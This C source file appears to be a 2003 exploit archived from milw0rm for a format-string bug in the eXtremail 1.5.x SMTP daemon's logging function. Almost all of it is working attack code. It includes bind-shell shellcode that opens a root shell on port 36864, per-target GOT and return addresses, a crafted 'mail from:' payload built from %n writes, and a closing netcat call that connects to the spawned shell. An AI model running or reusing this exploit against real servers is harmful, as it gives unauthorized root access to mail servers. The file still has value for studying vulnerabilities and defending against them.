/****************************************************************/
/* 	    Linux eXtremail 1.5.x Remote Format Strings Exploit	                */
/*                                                           		                                */
/*							*/
/*      	                       By B-r00t - 02/07/2003			*/
/*							*/
/*	Versions:       Linux eXtremail-1.5-8 => VULNERABLE		*/
/*		    Linux eXtremail-1.5-5 => VULNERABLE		*/
/*	Exploit uses format strings bug in fLog() of smtpd to bind a 	*/
/*	r00tshell to port 36864 on the target eXtremail server.		*/
/*							*/
/****************************************************************/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define EXPLOIT "eXtreme"
#define DEST_PORT 25

// Prototypes
int get_sock (char *host);
int send_sock (char *stuff);
int read_sock (void);
void usage (void);
int do_it (void);

// Globals
int socketfd, choice;
unsigned long GOT, RET;
char *myip;
char helo[] = "HELO Br00t~R0x~Y3r~W0rld!\n";
char shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
"\x40\x89\xc3\x89\x46\x0c\x40\x89"
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
"\x80\x43\xc6\x46\x10\x10\x88\x46"
"\x08\x31\xc0\x31\xd2\x89\x46\x18"
"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
"\x56\x10\xb0\x66\x43\xcd\x80\x86"
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
"\x80\x88\x56\x07\x89\x76\x0c\x87"
"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


struct {
        char *systemtype;
        unsigned long got;
        unsigned long ret;
        int pad;
        int buf;
        int pos;
} targets[] = {
	// Confirmed targets tested by B-r00t.
        { "RedHat 7.2 eXtremail V1.5 release 5 
(eXtremail-1.5-5.i686.rpm)",   0x0813b19c, 0xbefff1e8, 1, 266, 44},
        { "Linux ANY eXtremail V1.5 release 5 
(eXtremail-1.5-5.tar.gz)",   0x0813b19c, 0xbefff1b8, 1, 266, 44},
	{ "Linux ANY eXtremail V1.5 release 7 (ALL VERSIONS)",   0xbefff0c8, 
0xbefff1d4, 1, 266, 44},
        { "eXtremail V1.5 DEBUG",   0x44434241, 0xaaaaaaaa, 1, 266, 
44},
        { 0 } 
	};

int main ( int argc, char *argv[] )
{
char *TARGET = "TARGET";

printf ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003\n", 
EXPLOIT);

if (argc < 3) 
usage ();

choice = atoi(argv[2]);
if (choice < 0 || choice > 3) 
usage ();

setenv (TARGET, argv[1], 1);

get_sock(argv[1]);
sleep (1);
read_sock ();
sleep (1);
send_sock (helo);
sleep (1);
read_sock ();
sleep(1);
do_it ();
}


void usage (void)
{
        int loop;
	printf ("\nUsage: %s [IP_ADDRESS] [TARGET]", EXPLOIT);
        printf ("\nExample: %s 10.0.0.1 2 \n", EXPLOIT);
	for (loop = 0; targets[loop].systemtype; loop++)
			printf ("\n%d\t%s", loop, targets[loop].systemtype);
        printf ("\n\nOn success a r00tshell will be spawned on port 
36864.\n\n");
	exit (-1);
        }


int get_sock (char *host) 
{
struct sockaddr_in dest_addr;

if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        perror("Socket Error!\n");
        exit (-1);
        }

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(DEST_PORT);
if (! inet_aton(host, &(dest_addr.sin_addr))) {
        perror("inet_aton problems\n");
        exit (-2);
        }

memset( &(dest_addr.sin_zero), '\0', 8);
if (connect (socketfd, (struct sockaddr *)&dest_addr, sizeof (struct 
sockaddr)) == -1){
        perror("Connect failed!\n");
        close (socketfd);
        exit (-3);
        }
printf ("\n\nConnected to %s\n", host);
}



int send_sock (char *stuff) 
{
	int bytes;
        bytes = (send (socketfd, stuff, strlen(stuff), 0));
        if (bytes == -1) {
        perror("Send error");
        close (socketfd);
        exit(4);
	}
printf ("Send:\t%s", stuff);
return bytes;
}


int read_sock (void) 
{
        int bytes;
	char buffer[200];
	char *ptr;
	ptr = buffer;
	memset (buffer, '\0', sizeof(buffer));
        bytes = (recv (socketfd, ptr, sizeof(buffer), 0));
        if (bytes == -1) {
        perror("send error");
        close (socketfd);
        exit(4);
	}
printf ("Recv:\t%s", buffer);
return bytes;
}


int do_it (void)
{
char format[200], buf[500], *bufptr, *p;
int loop, sofar = 0;
int PAD = targets[choice].pad;
int POS = targets[choice].pos;
unsigned char r[3], g[3], w[3];

RET = targets[choice].ret;
r[0] = (int) (RET & 0x000000ff);
r[1] = (int)((RET & 0x0000ff00) >> 8);
r[2] = (int)((RET & 0x00ff0000) >> 16);
r[3] = (int)((RET & 0xff000000) >> 24);

GOT = targets[choice].got;
g[0] = (int) (GOT & 0x000000ff);
g[1] = (int)((GOT & 0x0000ff00) >> 8);
g[2] = (int)((GOT & 0x00ff0000) >> 16);
g[3] = (int)((GOT & 0xff000000) >> 24);


// Start buf
bufptr = buf;
bzero (bufptr, sizeof(buf));
strncpy (buf, "mail from: ", strlen("mail from: "));
sofar = 19;

// Do padding
for (loop=0; loop<PAD; loop++)
strncat (buf, "a", 1);
sofar = sofar+PAD;

//1st GOT addy
strncat (buf, g, 4);

//2nd GOT addy
p = &g[0];
(*p)++;
strncat (buf, g, 4);

// 3rd GOT addy
p = &g[0];
(*p)++;
strncat (buf, g, 4);

// 4th GOT addy
p = &g[0];
(*p)++;
strncat (buf, g, 4);
sofar = sofar+16;

for (loop=0; loop<4; loop++) {
			if (r[loop] > sofar) {
						w[loop] = r[loop]-sofar;
						} else
			if (r[loop] == sofar) {
						w[loop] = 0;
						}else
			if (r[loop] < sofar) {
						w[loop] = (256-sofar)+r[loop];
						}
			sofar = sofar+w[loop];
			}

bufptr = format;
bzero (bufptr, sizeof(format));
sprintf (bufptr, "%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n", 
w[0], POS, w[1], POS+1, w[2], POS+2, w[3], POS+3);
strncat (buf, format, sizeof(format));
strncat (buf, shellcode, sizeof(shellcode));

// Summarise
printf ("\nSystem type:\t\t%s", targets[choice].systemtype);
printf ("\nWrite Addy:\t\t0x%x", GOT);
printf ("\nRET (shellcode):\t0x%x", RET);
printf ("\nPAD (alignment):\t%d", PAD);
printf ("\nPayload:\t\t%d / %d max bytes", strlen(buf), 
targets[choice].buf);
printf ("\nSending it ... \n");
sleep(1);

// Ok lets Wack it!
send_sock (buf);
sleep (1);
close (socketfd);
printf ("\nUsing netcat 'nc' to get the r00tshell on port 36864 
....!!!!!\n\n\n");
sleep(3); // May take time to spawn a shell
system("nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'");
exit (0);
}

// milw0rm.com [2003-07-02]